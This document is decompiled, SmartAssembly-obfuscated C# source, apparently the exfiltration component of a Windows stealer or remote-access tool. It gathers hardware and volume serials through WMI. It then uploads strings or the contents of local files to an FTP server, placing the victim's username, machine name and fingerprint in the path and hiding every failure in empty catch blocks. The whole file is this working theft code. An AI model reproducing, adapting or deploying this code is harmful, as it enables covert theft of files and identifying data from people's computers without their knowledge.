using System;
using System.IO;
using System.Management;
using System.Net;
using System.Text;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace gZJMShdGuoGG;

internal sealed class DqGwyJRAyz
{
	[NonSerialized]
	internal static GetString getString_0;

	public static string uWVPeYDFbwJmk()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		//IL_00a9: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		string text = string.Empty;
		ManagementClass val = new ManagementClass(getString_0(107407675));
		ManagementObjectCollection instances = val.GetInstances();
		ManagementObjectEnumerator enumerator = instances.GetEnumerator();
		try
		{
			if (enumerator.MoveNext())
			{
				ManagementObject val2 = (ManagementObject)enumerator.get_Current();
				text = ((ManagementBaseObject)val2).get_Properties().get_Item(getString_0(107407622)).get_Value()
					.ToString();
			}
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
		string text2 = getString_0(107407637);
		ManagementObject val3 = new ManagementObject(getString_0(107407600) + text2 + getString_0(107407559));
		val3.Get();
		string text3 = ((ManagementBaseObject)val3).get_Item(getString_0(107407586)).ToString();
		return text3 + text;
	}

	public static void OVUveigiegjYM(string LvbWLVRtpWNRF = "URL", string CLBYiVsjVdWdlUpMx = "USERNAME", string hLADtTMzjlAbmL = "ACCESO", string UjijoDgiitfg = "")
	{
		try
		{
			string text = uWVPeYDFbwJmk();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(LvbWLVRtpWNRF + getString_0(107407529) + Environment.UserName + getString_0(107407548) + Environment.MachineName + getString_0(107407495) + text + getString_0(107407522));
			ftpWebRequest.Method = getString_0(107407513);
			ftpWebRequest.Credentials = new NetworkCredential(CLBYiVsjVdWdlUpMx, hLADtTMzjlAbmL);
			ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
			byte[] bytes = aSCIIEncoding.GetBytes(UjijoDgiitfg);
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	public static void CWnyAidUENok(string lFNKXdiQvA = "URL", string CnShwnJqGQqUgb = "USERNAME", string DIUdJcKSWRjL = "ACCESO", string mpnrmPBPen = "")
	{
		try
		{
			string text = uWVPeYDFbwJmk();
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(lFNKXdiQvA + getString_0(107407529) + Environment.UserName + getString_0(107407548) + Environment.MachineName + getString_0(107407495) + text + getString_0(107407522));
			ftpWebRequest.Method = getString_0(107407513);
			ftpWebRequest.Credentials = new NetworkCredential(CnShwnJqGQqUgb, DIUdJcKSWRjL);
			byte[] bytes;
			using (StreamReader streamReader = new StreamReader(mpnrmPBPen))
			{
				bytes = Encoding.UTF8.GetBytes(streamReader.ReadToEnd());
			}
			ftpWebRequest.ContentLength = bytes.Length;
			using Stream stream = ftpWebRequest.GetRequestStream();
			stream.Write(bytes, 0, bytes.Length);
		}
		catch
		{
		}
	}

	static DqGwyJRAyz()
	{
		Strings.CreateGetStringDelegate(typeof(DqGwyJRAyz));
	}
}
